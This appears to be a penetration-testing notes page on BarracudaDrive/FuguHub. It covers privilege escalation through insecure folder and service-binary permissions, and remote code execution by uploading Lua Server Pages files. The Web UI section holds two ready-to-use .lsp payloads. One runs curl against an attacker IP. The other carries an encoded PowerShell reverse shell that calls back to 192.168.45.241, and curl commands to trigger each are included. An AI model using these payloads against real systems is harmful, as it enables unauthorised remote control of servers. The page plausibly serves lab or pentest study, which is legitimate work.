---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# BarracudaDrive/FuguHub

[BarracudaDrive](https://fuguhub.com/), renamed to [FuguHub](https://fuguhub.com/readme.txt?utm_source=chatgpt.com) in version `7.5`, is a lightweight web application and content management system designed to provide remote file management, personal cloud storage, and secure access to private resources. It is frequently deployed on both personal and small business networks to simplify file sharing, remote administration, and content hosting. The platform integrates features such as secure tunnels, embedded web servers, and user-friendly management interfaces, making it a versatile solution for environments that require both accessibility and ease of configuration.

## Authenticated PE (Infra)

BarracudaDrive version `6.5` is affected by an **insecure folder permissions** vulnerability ([48789](https://www.exploit-db.com/exploits/48789)). The flaw exists because the application creates folders with improper access controls, **allowing non-privileged users to read or write data** that should otherwise remain restricted. By exploiting this weakness, an attacker can traverse into sensitive directories, upload or modify files, and potentially escalate privileges within the application environment.

```sh
# Insecure Folder Permission (C â†’ Create Files/Write Data)
C:\>cacls C:\bd
C:\bd BUILTIN\Administrators:(OI)(CI)(ID)F
      NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F
      BUILTIN\Users:(OI)(CI)(ID)R
      NT AUTHORITY\Authenticated Users:(ID)C
      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C

# Insecure File/Service Permission
C:\>cacls C:\bd\bd.exe
C:\bd\bd.exe BUILTIN\Administrators:(ID)F
             NT AUTHORITY\SYSTEM:(ID)F
             BUILTIN\Users:(ID)R
             NT AUTHORITY\Authenticated Users:(ID)C
```

See [Service Binary Hijacking](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/services#service-binary-hijacking) for how to leverage the above binary permissions.

## Authenticated PE (Web UI)

If access to the FuguHub UI is available, an `.lsp` payload can be uploaded to achieve RCE:

{% tabs %}
{% tab title="Test" %}
Payload based on [`rev.lsp`](https://github.com/the-emmons/lsp-reverse-shell/blob/main/rev.lsp):

{% code title="test_rce.lsp" overflow="wrap" %}
```lua
<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("cmd /c curl 192.168.45.241/test") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
```
{% endcode %}

```bash
curl http://fuguhub-instance:8000/test_rce.lsp
```
{% endtab %}

{% tab title="RevShell" %}
Payload based on [`rev.lsp`](https://github.com/the-emmons/lsp-reverse-shell/blob/main/rev.lsp):

{% code title="revshell.lsp" overflow="wrap" %}
```lua
<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAxACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
```
{% endcode %}

```bash
curl http://fuguhub-instance:8000/revshell.lsp
```
{% endtab %}
{% endtabs %}
